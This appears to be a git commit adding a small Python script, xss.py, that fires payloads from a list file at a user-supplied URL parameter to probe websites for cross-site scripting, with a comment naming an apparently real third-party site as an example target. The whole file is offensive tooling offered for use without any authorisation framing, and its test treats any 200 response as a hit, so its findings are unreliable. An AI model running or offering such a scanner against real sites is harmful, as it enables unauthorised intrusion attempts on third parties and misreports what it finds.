cfba1f9023c27d720eedeeaad04815d079bdeb4f
htw-lamer111 <124086931+htw-lamer111@users.noreply.github.com>
2023-01-31 13:01:33 -0600

    Add files via upload

---
+++ xss.py
@@ -0,0 +1,53 @@
+import requests
+from colorama import init, Fore
+from colorama import Back
+from colorama import Style
+import time
+init()
+print(Fore.GREEN, "="*50)
+print(Fore.GREEN, """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⡏⡆⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠛⠋⠉⠉⠉⠈⠉⠛⠛⢳⡇⠀
+⠀⠀⠀⠀⠀⢀⠞⠋⠀⠀⣷⣤⣀⣀⣀⠀⠀⠀⠀⠸⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣢⠄⠀⠀⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⡀⠀⠀⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡇⠀⣀⣇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣧⣴⣾⣻⡆
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣭⣾⣿⣿⣿⠉⣛⢿⠿⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣷⣶⣿⣻⣿⣆⠙⣿⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⣸⣔⣿⣿⡄⣿⠀⠀
+⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⡏⠀⠀
+⠐⠶⠶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀
+
+▐▄• ▄ .▄▄ · .▄▄ ·  ▌ ▐·▄• ▄▌▄▄▌   ▐ ▄ 
+ █▌█▌▪▐█ ▀. ▐█ ▀. ▪█·█▌█▪██▌██•  •█▌▐█
+ ·██· ▄▀▀▀█▄▄▀▀▀█▄▐█▐█•█▌▐█▌██▪  ▐█▐▐▌
+▪▐█·█▌▐█▄▪▐█▐█▄▪▐█ ███ ▐█▄█▌▐█▌▐▌██▐█▌
+•▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀ . ▀   ▀▀▀ .▀▀▀ ▀▀ █▪
+                                                                                                      
+    """)
+print("=" * 50)
+print("site example https://site.com/index.php?id=")
+d = {}
+file = open("list.txt", "r", encoding="utf-8")
+onstring = file.read().split("\n")[:-1]
+ 
+vizilom=input("site url:")
+try:
+    for bebra in onstring:
+        resp = requests.get(vizilom+'">'+bebra)
+        respurl = vizilom+'">'+ bebra
+        time.sleep(3)
+        if resp.status_code == 200:
+            print(respurl,"status code:", resp.status_code)
+        elif resp.status_code == 404:
+            print("website is not vulnerable")    
+        else:
+            print("An occured error")
+            print(resp.status_code)
+except KeyboardInterrupt:
+    print("Good bye....")
+#https://e-cis.info/index.php?id=8
